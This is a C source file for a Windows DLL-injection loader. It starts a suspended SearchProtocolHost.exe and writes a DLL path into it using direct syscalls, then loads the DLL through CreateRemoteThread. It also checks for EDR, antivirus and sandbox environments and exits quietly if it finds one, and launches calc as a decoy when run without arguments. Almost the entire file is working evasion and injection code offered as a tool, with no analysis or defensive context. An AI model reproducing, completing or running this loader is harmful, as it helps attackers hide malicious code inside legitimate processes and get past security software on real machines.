#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdbool.h>
#include "detector.h"
#include "evasion.h"

// Function to Resolve APIs
FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
    HMODULE hMod = GetModuleHandle(mod);
    if (!hMod) return NULL;

    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
        if (strcmp(currFn, fn) == 0) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Resolve Remote Module Handle
HMODULE FindModInProc(HANDLE hProc, const char* modName) {
    HMODULE hMods[512];
    DWORD needed;
    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &needed)) {
        for (int i = 0; i < (needed / sizeof(HMODULE)); i++) {
            char modPath[MAX_PATH];
            if (GetModuleFileNameExA(hProc, hMods[i], modPath, sizeof(modPath))) {
                const char* baseName = strrchr(modPath, '\\') ? strrchr(modPath, '\\') + 1 : modPath;
                if (_stricmp(baseName, modName) == 0) return hMods[i];
            }
        }
    }
    return NULL;
}

// Core Injection Logic
void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
    PVOID memLoc = NULL;
    SIZE_T sz = strlen(dllEnc) + 1;
    //SIZE_T sz = 0x10000;
    HANDLE hThreadRemote;
    NTSTATUS status;

    // Resolve Required Functions
    FARPROC pLLoad = ResolveFn("kernel32.dll", "LoadLibraryA");
    FARPROC pGProc = ResolveFn("kernel32.dll", "GetProcAddress");

    if (!pLLoad || !pGProc) {
        printf("[!] Unable to resolve core functions.\n");
        return;
    }

    SetSystemCall(GetSyscallNumber("NtAllocateVirtualMemory"));
    status = custAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
    } else {
        printf("[+] Memory allocated at: %p\n", memLoc);
    }

    if (memLoc == NULL) {
        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
        return;
    }

    SetSystemCall(GetSyscallNumber("NtWriteVirtualMemory"));
    // Write Encrypted DLL Path to Remote Process
    status = custWVM(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
    if (status != 0) {
        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
        return;
    }

    // Load Remote DLL
    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
    if (!hThreadRemote) {
        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
        return;
    }
    WaitForSingleObject(hThreadRemote, INFINITE);
    CloseHandle(hThreadRemote);

    // Verify if DLL is Loaded
    Sleep(500);
    HMODULE hRemMod = FindModInProc(hProc, strrchr(dllEnc, '\\') + 1);
    if (!hRemMod) {
        printf("[!] Module not found in remote process.\n");
        return;
    }

    printf("[*] Successfully injected module @ %p\n", hRemMod);
}

// Entry Function
int main(int argc, char* argv[]) {
    //Check For EDR/AV/Sandbox env
    if (PerfomChecksEnv()) {
        return 0;
    }
    
    //If no DLL given, abort.
    if (argc != 2) {
        LaunchCalc();
        return 0;
    }
    // IsNtDllHooked();
    // // if (IsNtDllHooked()) {
    // //     UnhookNtdll();
    // // }

    const char* dllPath = argv[1];

    STARTUPINFOA sInfo = { 0 };
    PROCESS_INFORMATION pInfo = { 0 };

    const char* procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
    const char* procName = "SearchProtocolHost.exe";
    //Also work with explorer.exe
    //const char* targetProcess = "C:\\Windows\\explorer.exe";
    //const char* targetProcessName = "explorer.exe";

    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo)) {
        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
        return -1;
    }

    printf("[*] Suspended %s created.\n", procName);

    // Perform Injection
    StealthExec(pInfo.hProcess, pInfo.hThread, dllPath);

    // Resume Execution
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);
    printf("[*] %s is now running.\n", procName);

    return 0;
}
